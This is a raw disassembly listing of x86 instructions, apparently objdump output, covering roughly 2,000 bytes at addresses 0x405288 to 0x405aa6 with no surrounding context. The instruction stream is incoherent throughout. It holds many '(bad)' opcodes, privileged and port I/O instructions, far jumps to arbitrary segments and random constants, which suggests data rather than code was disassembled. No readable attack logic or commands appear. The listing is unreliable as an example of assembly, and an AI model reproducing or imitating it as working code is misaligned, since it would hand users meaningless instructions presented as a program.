  405288:	nop
  405289:	cld    
  40528a:	and    BYTE PTR [eax-0x3d4dd1a8],bl
  405290:	fwait
  405291:	pop    edx
  405292:	adc    dh,dl
  405294:	inc    esi
  405295:	hlt    
  405296:	adc    al,bl
  405298:	cdq    
  405299:	jmp    0x4052f9
  40529b:	adc    ecx,DWORD PTR [ecx+ebp*2-0x45]
  40529f:	fbld   TBYTE PTR [esi-0x250931e3]
  4052a5:	int3   
  4052a6:	push   ss
  4052a7:	jle    0x4052cd
  4052a9:	xchg   ebp,eax
  4052aa:	mov    edx,0xc285fb3d
  4052af:	ja     0x4052d2
  4052b1:	push   edi
  4052b2:	cmc    
  4052b3:	pusha  
  4052b4:	call   ebx
  4052b6:	mulps  xmm6,XMMWORD PTR [esi]
  4052b9:	push   cs
  4052ba:	jmp    0x3f61:0x33be580
  4052c1:	data16 fs and al,0x84
  4052c5:	jecxz  0x40529c
  4052c7:	sbb    eax,0x5c552fa
  4052cc:	int    0xe3
  4052ce:	aaa    
  4052cf:	test   eax,0xec36758
  4052d4:	enter  0x2e94,0x38
  4052d8:	push   eax
  4052d9:	mov    eax,ds
  4052db:	add    edi,eax
  4052dd:	out    0xeb,eax
  4052df:	pop    eax
  4052e0:	inc    edi
  4052e1:	inc    ecx
  4052e2:	and    esi,DWORD PTR [ecx]
  4052e4:	ret    
  4052e5:	jmp    0x405356
  4052e7:	inc    ecx
  4052e8:	pop    ds
  4052e9:	cwde   
  4052ea:	les    ecx,FWORD PTR ds:0xa16641c2
  4052f0:	(bad)  
  4052f1:	imul   ebp,DWORD PTR [edx+eax*1+0x6f],0xffffffa2
  4052f6:	jmp    0xa851:0x9e30fa1a
  4052fd:	mov    ch,0x60
  4052ff:	push   ss
  405300:	push   edx
  405301:	push   edi
  405302:	(bad)  
  405304:	js     0x40530a
  405306:	enter  0xf68f,0x8d
  40530a:	mov    ebx,0xda144337
  40530f:	cmp    esp,DWORD PTR [ebp+0x1]
  405312:	mov    edi,0x5488baf2
  405317:	cmp    al,0x5c
  405319:	sbb    edi,DWORD PTR [edi+eiz*4-0x343cd545]
  405320:	fwait
  405321:	sti    
  405322:	pop    edi
  405323:	test   BYTE PTR [edx+0x5a],dl
  405326:	or     DWORD PTR [ecx],esi
  405328:	lods   eax,DWORD PTR ds:[esi]
  405329:	cli    
  40532a:	and    ecx,DWORD PTR [ebx]
  40532c:	into   
  40532d:	stc    
  40532e:	cmp    ah,BYTE PTR [eax+0x19f36114]
  405334:	add    al,0xff
  405336:	and    al,0xae
  405338:	cs push edi
  40533a:	cli    
  40533b:	and    bh,cl
  40533d:	int3   
  40533e:	fdiv   QWORD PTR [eax+0x34]
  405341:	outs   dx,DWORD PTR ds:[esi]
  405342:	sbb    edi,ecx
  405344:	out    0x20,eax
  405346:	add    eax,0x7a853ba4
  40534b:	push   ecx
  40534c:	test   DWORD PTR [esi+0x2f513c67],edi
  405352:	cmp    eax,0xc3b2bd4b
  405357:	sbb    BYTE PTR [esi+0x37],dl
  40535a:	lea    eax,[ebp-0x10]
  40535d:	cmc    
  40535e:	jmp    0x21c4:0x1eb3caae
  405365:	sub    al,bh
  405367:	test   ch,bh
  405369:	mov    eax,DWORD PTR [eax]
  40536b:	int    0x17
  40536d:	xor    cl,BYTE PTR [ebp+0x72a9de08]
  405373:	icebp  
  405374:	mov    al,0x83
  405376:	pop    edx
  405377:	es ins BYTE PTR es:[edi],dx
  405379:	sbb    eax,DWORD PTR [esp+ebp*2+0x34428a3f]
  405380:	add    BYTE PTR ds:0x998d65b1,al
  405386:	inc    esp
  405387:	xor    DWORD PTR [esi-0x67],esi
  40538a:	stos   DWORD PTR es:[edi],eax
  40538b:	jbe    0x40533b
  40538d:	sub    eax,0xfa78543d
  405392:	mov    edi,0x51848ef6
  405397:	and    al,0x6a
  405399:	mov    ebx,0xb7bd6983
  40539e:	inc    ebx
  40539f:	and    eax,0x7d051762
  4053a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053a5:	mov    ebx,0xddb2ee42
  4053aa:	gs mov edi,0xf08e1054
  4053b0:	mov    eax,0xeba773c2
  4053b5:	ins    BYTE PTR es:[edi],dx
  4053b6:	xchg   ecx,edi
  4053b8:	push   cs
  4053b9:	fcomp  DWORD PTR [ebx-0x52]
  4053bc:	fcom   DWORD PTR [eax-0xb7c2b0e]
  4053c2:	inc    edx
  4053c3:	add    DWORD PTR [ebp+ebx*2-0x49],edx
  4053c7:	test   eax,0x985dfe9d
  4053cc:	dec    esp
  4053cd:	add    BYTE PTR [ebx+edx*8-0x6697e5ab],0x33
  4053d5:	sub    eax,0x91faafc4
  4053da:	and    ecx,ebx
  4053dc:	xor    ecx,DWORD PTR [edx]
  4053de:	xlat   BYTE PTR ds:[ebx]
  4053df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053e0:	call   0x3e357ee1
  4053e5:	adc    al,0xda
  4053e7:	mov    al,ds:0xfcae46c6
  4053ec:	(bad)  
  4053ed:	mov    ds:0x73f35ffb,eax
  4053f2:	rol    BYTE PTR [esp+edi*8],0x13
  4053f6:	ret    
  4053f7:	dec    esp
  4053f8:	add    eax,0xca03dd60
  4053fd:	adc    BYTE PTR [edx],dh
  4053ff:	inc    ecx
  405400:	add    ecx,DWORD PTR [esi-0x2f]
  405403:	add    ah,ch
  405405:	dec    esp
  405406:	and    dh,BYTE PTR [esi]
  405408:	(bad)  
  405409:	sbb    ch,BYTE PTR [ecx+0x469e956d]
  40540f:	push   cs
  405410:	cmc    
  405411:	add    BYTE PTR [edi-0x7c690233],ah
  405417:	cmp    BYTE PTR [esi+eiz*1-0x45],dh
  40541b:	push   0xffffffdc
  40541d:	adc    dh,bl
  40541f:	dec    edi
  405420:	sbb    al,0x76
  405422:	(bad)  
  405423:	ds aam 0xc7
  405426:	and    DWORD PTR [ecx-0x71],edx
  405429:	je     0x40544f
  40542b:	or     edx,ebp
  40542d:	(bad)  
  40542e:	sub    ebp,DWORD PTR [edx+0x68]
  405431:	shl    DWORD PTR gs:[ecx-0x7731f5f1],1
  405438:	loopne 0x4053ef
  40543a:	daa    
  40543b:	in     eax,dx
  40543c:	and    al,cl
  40543e:	shl    BYTE PTR [ebx-0x1de5e92c],1
  405444:	in     eax,0x33
  405446:	sar    DWORD PTR [edi+ebp*2],cl
  405449:	add    eax,0xa59f670b
  40544e:	(bad)  
  40544f:	and    cl,BYTE PTR [edx+0x1e]
  405452:	mov    al,ds:0x48a12d7f
  405457:	sbb    ch,BYTE PTR [esi-0x30f7227b]
  40545d:	jmp    0xbc45a974
  405462:	ret    
  405463:	sub    eax,0x4a2dfe2d
  405468:	and    BYTE PTR [ebp-0xedbf92d],0x36
  40546f:	jo     0x40548a
  405471:	arpl   WORD PTR [ebx+0x8],dx
  405474:	fadd   st(3),st
  405476:	ds mov bl,0x16
  405479:	pusha  
  40547a:	(bad)  
  40547b:	int    0xc6
  40547d:	pop    edx
  40547e:	leave  
  40547f:	cs sub al,0x8a
  405482:	push   es
  405483:	jmp    0xad0662dc
  405488:	(bad)  
  405489:	scas   al,BYTE PTR es:[edi]
  40548a:	xor    esi,esp
  40548c:	mov    cl,0x6f
  40548e:	push   ebx
  40548f:	xor    WORD PTR [edx],di
  405492:	mov    eax,ds:0x459faef1
  405497:	sub    dh,BYTE PTR [ecx+0x19]
  40549a:	xchg   esp,eax
  40549b:	push   0x17
  40549d:	pushf  
  40549e:	inc    esp
  40549f:	xor    BYTE PTR [edx],bh
  4054a1:	sti    
  4054a2:	bound  esi,QWORD PTR [edi-0x3e78ec90]
  4054a8:	test   al,0xd8
  4054aa:	jg     0x405452
  4054ac:	ja     0x4054f6
  4054ae:	retf   
  4054af:	loop   0x40544e
  4054b1:	fstp   TBYTE PTR [eax+eax*4-0x15]
  4054b5:	push   cs
  4054b6:	call   0x70bc:0x55d9b06f
  4054bd:	jecxz  0x405443
  4054bf:	call   DWORD PTR [edx]
  4054c1:	mov    BYTE PTR [ebx-0x330b3c1f],0x5c
  4054c8:	push   ds
  4054c9:	dec    ebx
  4054ca:	(bad)  
  4054cc:	(bad)  
  4054cd:	fdivr  DWORD PTR [eax]
  4054cf:	cs adc esp,ecx
  4054d2:	inc    eax
  4054d3:	xchg   DWORD PTR [ebx+0x12],eax
  4054d6:	mov    dh,bl
  4054d8:	mov    al,ah
  4054da:	dec    esi
  4054db:	fwait
  4054dc:	push   edi
  4054dd:	stc    
  4054de:	inc    ecx
  4054df:	mov    dl,0xa1
  4054e1:	retf   0xbcdb
  4054e4:	jg     0x405530
  4054e6:	mov    al,0xe7
  4054e8:	cmc    
  4054e9:	fmul   DWORD PTR [eax-0x4c]
  4054ec:	jo     0x40550b
  4054ee:	popf   
  4054ef:	cmp    al,0x72
  4054f1:	outs   dx,DWORD PTR ds:[esi]
  4054f2:	xchg   esp,eax
  4054f3:	repnz sbb BYTE PTR [edi+0x204f1e63],0xb3
  4054fb:	inc    eax
  4054fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054fd:	test   eax,0xa44310f7
  405502:	and    ecx,eax
  405504:	gs jnp 0x4054c3
  405507:	les    ecx,FWORD PTR [edi+0x7fa60d9]
  40550d:	jbe    0x40550d
  40550f:	stos   DWORD PTR es:[edi],eax
  405510:	lock xchg edi,eax
  405512:	sbb    esi,DWORD PTR [ecx+0x5e]
  405515:	add    eax,0x86a2abd1
  40551a:	loop   0x40550c
  40551c:	sub    BYTE PTR [esi],cl
  40551e:	mul    DWORD PTR [eax-0x15196e20]
  405524:	fnsave [ebx]
  405526:	and    BYTE PTR [eax+0xc],al
  405529:	pop    ecx
  40552a:	es sbb eax,0x4f35e1d2
  405530:	shl    BYTE PTR ds:[ebx+0x29c2dab3],1
  405537:	push   ss
  405538:	lods   eax,DWORD PTR ds:[esi]
  405539:	sti    
  40553a:	shl    BYTE PTR [ebp-0x5fee2925],1
  405540:	and    eax,0x226ce42
  405545:	sti    
  405546:	push   es
  405547:	jb     0x405578
  405549:	in     al,0x82
  40554b:	fisub  WORD PTR [edi+ebx*1+0x3b]
  40554f:	pop    ebx
  405550:	or     DWORD PTR [edx-0x22],eax
  405553:	jp     0x405536
  405555:	mov    dh,BYTE PTR ds:0x268bfa58
  40555b:	jmp    0x9cec:0xa8ca253f
  405562:	and    BYTE PTR [eax],bl
  405564:	sbb    al,0x0
  405566:	rcr    edx,0x66
  405569:	in     eax,0x3c
  40556b:	mov    al,0x2e
  40556d:	adc    eax,0x60f9bda
  405572:	cdq    
  405573:	jmp    0x40559c
  405575:	add    esi,edi
  405577:	add    al,BYTE PTR [edi-0x62]
  40557a:	push   ds
  40557b:	(bad)  
  40557c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40557d:	or     bl,dh
  40557f:	mov    dl,0xe2
  405581:	out    0x28,al
  405583:	loopne 0x4055a8
  405585:	or     al,bl
  405587:	mov    eax,0xe22aa1f4
  40558c:	xor    al,0xe5
  40558e:	ror    eax,0xff
  405591:	sar    DWORD PTR [ebx],cl
  405593:	enter  0x9424,0x43
  405597:	xor    dl,BYTE PTR [esp+ebx*1+0x71]
  40559b:	pusha  
  40559c:	mov    eax,0x39abbe6a
  4055a1:	imul   esp,ebx,0x1bcbc571
  4055a7:	arpl   WORD PTR [edx],di
  4055a9:	pushf  
  4055aa:	lods   al,BYTE PTR ds:[esi]
  4055ab:	arpl   WORD PTR [esi+0x2e4b4e83],bx
  4055b1:	push   es
  4055b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055b3:	mov    ebp,0xc2c90ebd
  4055b8:	sub    ch,0x20
  4055bb:	fisttp QWORD PTR [eax+0x7a]
  4055be:	inc    edx
  4055bf:	inc    esi
  4055c0:	adc    eax,0x20f3b37e
  4055c5:	shr    DWORD PTR [edx+0x51],0x25
  4055c9:	and    dl,cl
  4055cb:	imul   eax,DWORD PTR [ecx+0xbae75a5],0x89589c41
  4055d5:	stc    
  4055d6:	add    edx,DWORD PTR [esi]
  4055d8:	test   DWORD PTR [ecx],ebp
  4055da:	pop    edx
  4055db:	push   ss
  4055dc:	pop    esi
  4055dd:	repz mov ds:0xcb7d9240,eax
  4055e3:	or     ch,ch
  4055e5:	xchg   ecx,eax
  4055e6:	mov    bl,BYTE PTR [ecx-0x21b39a36]
  4055ec:	or     bl,BYTE PTR [edi+ebp*8]
  4055ef:	lahf   
  4055f0:	sahf   
  4055f1:	stos   DWORD PTR es:[edi],eax
  4055f2:	or     ebp,ebx
  4055f4:	xor    edx,DWORD PTR [ebx]
  4055f6:	mov    ah,0xe7
  4055f8:	mov    esp,0xb9776d1
  4055fd:	fs mov al,0xa2
  405600:	push   0x3b
  405602:	rcr    DWORD PTR [ebp+0x13],0xb9
  405606:	jle    0x4055c6
  405608:	mov    esi,0x638570dc
  40560d:	sbb    DWORD PTR [ecx+0x4ea1afdc],0xffffff81
  405614:	cmp    BYTE PTR [ebx],dl
  405616:	lods   al,BYTE PTR ds:[esi]
  405617:	rcl    DWORD PTR [esi-0x1c68860e],1
  40561d:	fldenv [ebp+0x1faa8ec1]
  405623:	imul   esp,esi,0x7cd7952c
  405629:	stc    
  40562a:	pusha  
  40562b:	scas   al,BYTE PTR es:[edi]
  40562c:	js     0x40567f
  40562e:	mov    cl,0xc0
  405630:	call   esp
  405632:	jg     0x4055d8
  405634:	imul   ebx,DWORD PTR [edi-0x3b],0xffffff96
  405638:	leave  
  405639:	mov    ds:0x3d0b9f0d,al
  40563e:	out    0xc9,al
  405640:	xchg   ecx,eax
  405641:	test   eax,0x2f03cf42
  405646:	and    dl,BYTE PTR [esi-0x26fd1d34]
  40564c:	add    BYTE PTR [eax-0x45a2760a],dh
  405652:	lods   al,BYTE PTR ds:[esi]
  405653:	ret    
  405654:	jecxz  0x40566f
  405656:	aad    0xb4
  405658:	hlt    
  405659:	mov    WORD PTR [edx],gs
  40565b:	jmp    0x2a3f5988
  405660:	ror    DWORD PTR [eax+0x5b30f923],1
  405666:	cdq    
  405667:	fdivr  QWORD PTR [esi-0x6f10ec46]
  40566d:	or     BYTE PTR [esi+0x2ac7fd92],cl
  405673:	rcl    BYTE PTR [ecx],0x25
  405676:	mov    bl,0x86
  405678:	shl    BYTE PTR [ebp-0x6b3ef0aa],0x52
  40567f:	test   BYTE PTR [ecx-0x5b],bh
  405682:	push   ss
  405683:	jno    0x4056eb
  405685:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405687:	stos   BYTE PTR es:[edi],al
  405688:	lahf   
  405689:	jecxz  0x4056e7
  40568b:	nop
  40568c:	push   ebp
  40568d:	aaa    
  40568e:	inc    ebx
  40568f:	fisttp WORD PTR [eiz*2-0x511406a0]
  405696:	shl    BYTE PTR [eax-0xe],cl
  405699:	xor    DWORD PTR [ebp-0x1d4573bf],0x1ae08bf9
  4056a3:	mov    WORD PTR [edx+edx*1-0x5f],es
  4056a7:	(bad)  [edx+0x63865de9]
  4056ad:	add    ebx,DWORD PTR [ebx+0x3ecbf3f2]
  4056b3:	popa   
  4056b4:	fs jmp 0x1adb:0x59f46416
  4056bc:	iret   
  4056bd:	pop    ss
  4056be:	test   edi,ebp
  4056c0:	sti    
  4056c1:	aaa    
  4056c2:	xchg   esi,eax
  4056c3:	push   ecx
  4056c4:	xchg   ebp,eax
  4056c5:	sbb    ebp,DWORD PTR [esp+ebx*8+0x4a]
  4056c9:	sub    eax,0x3b69bd17
  4056ce:	xchg   edi,eax
  4056cf:	std    
  4056d0:	repnz mov edx,DWORD PTR [esi+0x5ea28159]
  4056d7:	pusha  
  4056d8:	dec    eax
  4056d9:	and    DWORD PTR [eax+0x78],esp
  4056dc:	mov    ebx,0x60244a8e
  4056e1:	or     DWORD PTR [ebx],esp
  4056e3:	pop    ebx
  4056e4:	mov    bh,0x88
  4056e6:	inc    ebp
  4056e7:	cmp    DWORD PTR [edi+0x1],ebp
  4056ea:	mov    ds:0x4bf9818b,al
  4056ef:	mov    BYTE PTR [ebp+0xd],ah
  4056f2:	fwait
  4056f3:	push   edi
  4056f4:	(bad)  
  4056f5:	adc    BYTE PTR [ecx+0x51],bl
  4056f8:	sub    BYTE PTR [esi-0x4d],dl
  4056fb:	and    ah,bh
  4056fd:	lds    esp,FWORD PTR [eax]
  4056ff:	push   0x38f9e43a
  405704:	in     eax,dx
  405705:	xchg   BYTE PTR [ecx],bl
  405707:	pop    eax
  405708:	sub    eax,0x5949f67f
  40570d:	icebp  
  40570e:	add    BYTE PTR [eax+esi*2],bh
  405711:	test   DWORD PTR [esp+eiz*4],edi
  405714:	fs inc edi
  405716:	xchg   ecx,eax
  405717:	clc    
  405718:	mov    bh,0xd4
  40571a:	jp     0x4056d5
  40571c:	jae    0x405730
  40571e:	dec    ebx
  40571f:	push   0x7be75139
  405724:	pop    ss
  405725:	xchg   ebx,eax
  405726:	push   0x88dc4cdc
  40572b:	mov    ebx,0xa8d14924
  405730:	jmp    0xaa56:0x78e422b4
  405737:	cs xor al,0xfb
  40573a:	inc    eax
  40573b:	nop
  40573c:	push   edi
  40573d:	imul   ecx,DWORD PTR [edx+0x78d5b88b],0x1a1b9335
  405747:	cld    
  405748:	popa   
  405749:	push   cs
  40574a:	mov    eax,0x4a19a982
  40574f:	aas    
  405750:	jne    0x40576f
  405752:	add    esi,ecx
  405754:	shl    esi,0x32
  405757:	dec    eax
  405758:	pop    es
  405759:	jbe    0x405716
  40575b:	inc    ebp
  40575c:	mov    ds:0x1e5f2d1f,eax
  405761:	ins    DWORD PTR es:[edi],dx
  405762:	shl    BYTE PTR ds:0x685ae9d7,1
  405768:	jo     0x4057ab
  40576a:	inc    ebx
  40576b:	ret    0xe8c5
  40576e:	cmp    DWORD PTR [ebx+0x9],eax
  405771:	lds    edi,FWORD PTR [ebx]
  405773:	iret   
  405774:	add    BYTE PTR [edx],bh
  405776:	mov    dh,0x94
  405778:	sbb    al,0xbc
  40577a:	push   ecx
  40577b:	fisubr WORD PTR ds:0xefbac41a
  405781:	add    ch,BYTE PTR [esi]
  405783:	mov    bl,0x0
  405785:	sbb    eax,0x84f116d4
  40578a:	xor    al,0xf4
  40578c:	add    eax,0xffb7df11
  405791:	add    BYTE PTR [ebx+eiz*8-0x60],bl
  405795:	adc    edx,DWORD PTR [ebp+0x2bfc784]
  40579b:	aad    0xc1
  40579d:	and    eax,0x15faf714
  4057a2:	loope  0x4057e4
  4057a4:	fsub   st,st(5)
  4057a6:	cmp    BYTE PTR [edi+0x1bdd780e],ah
  4057ac:	mov    al,ds:0x62f489e7
  4057b1:	frstor [edx-0x52]
  4057b4:	jae    0x405811
  4057b6:	xchg   dh,al
  4057b8:	in     al,dx
  4057b9:	jmp    0xace3:0xdfeb9d59
  4057c0:	into   
  4057c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057c2:	sbb    al,dh
  4057c4:	sbb    esp,DWORD PTR [edx]
  4057c6:	inc    edx
  4057c7:	mov    ds:0xa87cc5bc,al
  4057cc:	sub    edx,DWORD PTR [edi-0x78]
  4057cf:	jmp    0x405787
  4057d1:	(bad)  
  4057d2:	stos   DWORD PTR es:[edi],eax
  4057d3:	fs enter 0x5b6f,0x21
  4057d8:	arpl   WORD PTR [ebp-0x49],cx
  4057db:	inc    ecx
  4057dc:	and    dh,BYTE PTR [ecx+0x3d7f2427]
  4057e2:	popf   
  4057e3:	pop    esp
  4057e4:	push   ebx
  4057e5:	aad    0x7e
  4057e7:	push   ss
  4057e8:	aas    
  4057e9:	jne    0x40577b
  4057eb:	cmc    
  4057ec:	mov    ebp,0x481a6dba
  4057f1:	push   es
  4057f2:	pusha  
  4057f3:	jb     0x4057d7
  4057f5:	xchg   DWORD PTR [ebp+0x7d],eax
  4057f8:	arpl   WORD PTR [ecx],ax
  4057fa:	mov    cl,0x39
  4057fc:	mov    esp,0x7a07c2a8
  405801:	or     BYTE PTR [ecx+0x6ebb845b],dl
  405807:	mov    al,0x4a
  405809:	sbb    eax,0x8794f080
  40580e:	arpl   WORD PTR [ebx],cx
  405810:	inc    edx
  405811:	sub    DWORD PTR [ecx+0x3d],edi
  405814:	mov    ds:0x711d79ae,eax
  405819:	cmp    al,0x9c
  40581b:	add    eax,0x1e5bd39f
  405820:	pop    es
  405821:	je     0x4057f9
  405823:	or     dl,BYTE PTR [eax-0xa]
  405826:	sub    BYTE PTR [eax-0x3e],dl
  405829:	ja     0x4057c4
  40582b:	mov    dh,BYTE PTR [edi]
  40582d:	ficomp WORD PTR [esi]
  40582f:	jae    0x4057cb
  405831:	xchg   edx,eax
  405832:	mov    bh,BYTE PTR [edi+0x14]
  405835:	pop    eax
  405836:	rcl    dh,0xbc
  405839:	inc    edi
  40583a:	xchg   ebp,eax
  40583b:	icebp  
  40583c:	sub    ecx,DWORD PTR [ebp+0x15b097a]
  405842:	sub    eax,0x1acff92f
  405847:	ror    BYTE PTR [edx],1
  405849:	sub    ebp,DWORD PTR [esp+ebp*2-0x46fc0c56]
  405850:	ds adc al,0xa6
  405853:	rcl    DWORD PTR [esi],1
  405855:	out    0x32,al
  405857:	push   ecx
  405858:	dec    edx
  405859:	dec    edi
  40585a:	inc    ebx
  40585b:	push   es
  40585c:	xor    ecx,DWORD PTR [esi-0x40c294e3]
  405862:	out    0x2a,eax
  405864:	rcl    BYTE PTR cs:0x22c4e23a,0xd9
  40586c:	pop    ds
  40586d:	fcomip st,st(0)
  40586f:	test   BYTE PTR [edx],bl
  405871:	xchg   ebp,eax
  405872:	ds cld 
  405874:	and    al,0x7
  405876:	sti    
  405877:	push   es
  405878:	in     eax,dx
  405879:	jnp    0x4058a2
  40587b:	rcr    BYTE PTR [edx],cl
  40587d:	sub    dl,bh
  40587f:	mov    DWORD PTR [ebp-0x6f],edi
  405882:	jo     0x405883
  405884:	add    eax,0xbe9ecac2
  405889:	js     0x4058ac
  40588b:	mov    ebp,0xcf62a395
  405890:	xor    ch,dh
  405892:	inc    edx
  405893:	dec    ebp
  405894:	fnsave [edx-0x7a]
  405897:	cdq    
  405898:	mov    edx,0x18d50195
  40589d:	pop    ebx
  40589e:	dec    edx
  4058a0:	cmp    eax,0x41eff35a
  4058a5:	ret    0x4b1e
  4058a8:	jmp    0x1c5:0xcdf1e241
  4058af:	push   0x22f65861
  4058b4:	mov    ds:0xb1a9917a,eax
  4058b9:	fidiv  DWORD PTR [esi-0x17]
  4058bc:	pop    ebx
  4058bd:	and    bl,BYTE PTR [edx-0x1bb55309]
  4058c3:	push   0x14343ea2
  4058c8:	dec    esp
  4058c9:	inc    ecx
  4058ca:	mov    BYTE PTR [ebx+edx*4+0x22],al
  4058ce:	xchg   edx,eax
  4058cf:	push   eax
  4058d0:	rcr    edx,cl
  4058d2:	and    dh,BYTE PTR [esi-0x577ea382]
  4058d8:	mov    ah,0xc8
  4058da:	lods   al,BYTE PTR ds:[esi]
  4058db:	cmc    
  4058dc:	arpl   WORD PTR [ebx-0x3a],bx
  4058df:	out    dx,eax
  4058e0:	lods   eax,DWORD PTR ds:[esi]
  4058e1:	jl     0x4058ff
  4058e3:	lock push ebp
  4058e5:	cmp    dh,bl
  4058e7:	test   ebx,eax
  4058e9:	mov    al,0xeb
  4058eb:	(bad)  
  4058ec:	adc    edx,DWORD PTR [ebx-0x43]
  4058ef:	jge    0x4058e5
  4058f1:	push   eax
  4058f2:	call   0x12f25533
  4058f7:	ja     0x40591a
  4058f9:	aad    0xd2
  4058fb:	(bad)  
  4058fc:	(bad)  
  4058fe:	das    
  4058ff:	pop    ebx
  405900:	fnsave [esi-0x2c]
  405903:	mov    BYTE PTR [ecx],dh
  405905:	mov    ebp,0x8be74982
  40590a:	retf   0x2e3d
  40590d:	or     BYTE PTR [edi],ah
  40590f:	dec    edi
  405910:	rol    DWORD PTR [ecx+0x5],0xc9
  405914:	mov    ebx,0xe6bbfbe4
  405919:	add    bl,BYTE PTR ds:0x317c03dd
  40591f:	adc    bh,0x14
  405922:	add    dl,bl
  405924:	ret    
  405925:	xor    esi,esi
  405927:	push   cs
  405928:	mov    eax,ds:0x2882398f
  40592d:	sbb    cl,bl
  40592f:	mov    esi,0x753b9cf4
  405934:	bound  eax,QWORD PTR [edi-0x3a]
  405937:	in     al,dx
  405938:	mov    ds:0x7a07bd2,eax
  40593d:	shl    BYTE PTR [eax],cl
  40593f:	mov    al,ds:0x779bc8f2
  405944:	and    DWORD PTR [edi],esi
  405946:	cmc    
  405947:	sub    DWORD PTR [esp+eax*4+0x1b2afa25],0x5cedadc6
  405952:	and    DWORD PTR [edi+edi*1],esi
  405955:	shr    DWORD PTR [edi+0x65e5c3d6],cl
  40595b:	jo     0x4059a5
  40595d:	jg     0x405950
  40595f:	aad    0x87
  405961:	cld    
  405962:	jecxz  0x4058e8
  405964:	jge    0x4059b1
  405966:	xchg   edx,eax
  405967:	aad    0xf0
  405969:	cmc    
  40596a:	dec    esi
  40596b:	xchg   ebp,eax
  40596c:	ucomiss xmm5,DWORD PTR [ebp+edi*4-0x2c]
  405971:	test   BYTE PTR [eax],ah
  405973:	call   0xdb0e71af
  405978:	sub    BYTE PTR [edx+0x3f],dl
  40597b:	and    ah,dh
  40597d:	ret    0x779e
  405980:	mov    esp,0x3b39fd55
  405985:	add    eax,0x99c59bea
  40598a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40598b:	pop    ss
  40598c:	adc    BYTE PTR [ebx],ah
  40598e:	dec    esp
  40598f:	mov    bl,0xeb
  405991:	sbb    DWORD PTR ds:0xf91d10ef,0x4d86a098
  40599b:	(bad)  
  40599c:	dec    esp
  40599d:	mov    es,ebx
  40599f:	call   0x9b6f:0x9357e49c
  4059a6:	(bad)  
  4059a7:	dec    edx
  4059a8:	mul    DWORD PTR [ebx+ebp*1]
  4059ab:	cmp    al,BYTE PTR [edi]
  4059ad:	pop    ds
  4059ae:	hlt    
  4059af:	dec    ebp
  4059b0:	mov    cl,BYTE PTR [ebx+0x4b021516]
  4059b6:	mov    ch,0x27
  4059b8:	ret    0x23a5
  4059bb:	repz and al,0xb
  4059be:	shl    DWORD PTR [edx-0x1b966b5e],1
  4059c4:	arpl   di,ax
  4059c6:	push   ss
  4059c7:	popa   
  4059c8:	sub    eax,DWORD PTR [ebx+esi*8-0x35]
  4059cc:	scas   eax,DWORD PTR es:[edi]
  4059cd:	(bad)  
  4059ce:	bnd jne 0x4059b4
  4059d1:	add    BYTE PTR [edi+0x40da233c],bl
  4059d7:	push   ss
  4059d8:	xor    al,0x46
  4059da:	mov    bl,0x41
  4059dc:	mov    ebp,0x7dae536b
  4059e1:	adc    BYTE PTR [eax+0x189a9c5a],bh
  4059e7:	jno    0x405971
  4059e9:	add    al,0x26
  4059eb:	dec    edi
  4059ec:	stos   DWORD PTR es:[edi],eax
  4059ed:	mov    dl,0x52
  4059ef:	jp     0x4059eb
  4059f1:	int    0x80
  4059f3:	inc    ecx
  4059f4:	xchg   esp,eax
  4059f5:	out    dx,eax
  4059f6:	sub    al,0xae
  4059f8:	adc    eax,0xca06b263
  4059fd:	(bad)  
  4059fe:	dec    esp
  4059ff:	inc    edx
  405a00:	mov    dh,0x1e
  405a02:	out    dx,al
  405a03:	out    0x83,al
  405a05:	int    0x80
  405a07:	jmp    0x12e5:0x7338d5ad
  405a0e:	xchg   esp,eax
  405a0f:	cs adc eax,0x7ffa4ade
  405a15:	arpl   sp,sp
  405a17:	loop   0x4059ed
  405a19:	das    
  405a1a:	and    eax,DWORD PTR [eax-0x6d568ec0]
  405a20:	and    cl,0x24
  405a23:	shl    BYTE PTR [eax],0x72
  405a26:	hlt    
  405a27:	rcr    BYTE PTR [edi-0x58],cl
  405a2a:	mov    bh,0x7f
  405a2c:	jecxz  0x405a9e
  405a2e:	ins    BYTE PTR es:[edi],dx
  405a2f:	add    DWORD PTR [ebp+0x2d],ecx
  405a32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a33:	pop    ebp
  405a34:	mov    cl,BYTE PTR [ebx+0x64]
  405a37:	add    bh,BYTE PTR [ebx]
  405a39:	pushf  
  405a3a:	and    al,0xea
  405a3c:	pop    edx
  405a3d:	sbb    esi,DWORD PTR [ebx-0x69]
  405a40:	push   esp
  405a41:	xor    ecx,esp
  405a43:	icebp  
  405a44:	lods   eax,DWORD PTR ds:[esi]
  405a45:	retf   0x5534
  405a48:	xor    BYTE PTR [eax-0x5],cl
  405a4b:	icebp  
  405a4c:	std    
  405a4d:	aad    0x3f
  405a4f:	dec    esp
  405a50:	xor    eax,0x5631eb4c
  405a55:	aam    0x9a
  405a57:	jge    0x405ac7
  405a59:	lds    edi,FWORD PTR [ebx]
  405a5b:	push   ss
  405a5c:	and    al,0xa3
  405a5e:	pop    ebp
  405a5f:	aas    
  405a60:	push   ebx
  405a61:	xor    BYTE PTR [ebp-0xf],bh
  405a64:	push   ds
  405a65:	jns    0x4059ee
  405a67:	in     eax,0x87
  405a69:	test   BYTE PTR [ebp-0x64],cl
  405a6c:	dec    ebx
  405a6d:	ins    BYTE PTR es:[edi],dx
  405a6e:	mov    eax,ds:0xc08ddbd8
  405a73:	icebp  
  405a74:	xchg   edi,eax
  405a75:	mov    BYTE PTR [edx+0x1f],dl
  405a78:	pop    esp
  405a79:	aaa    
  405a7a:	mov    ebp,0x63bd3771
  405a7f:	push   es
  405a80:	jmp    0x42ab:0x966bee80
  405a87:	jnp    0x405aeb
  405a89:	cmpxchg DWORD PTR [ebx],esi
  405a8c:	cmp    cl,BYTE PTR ds:0x667aad8b
  405a92:	dec    esi
  405a93:	test   eax,0xf9e6566d
  405a98:	mov    ecx,0x65e2242e
  405a9d:	sbb    eax,0xdef6f1d2
  405aa2:	push   es
  405aa3:	retf   0x6b04
  405aa6:	mov    eax,0x62caaaae
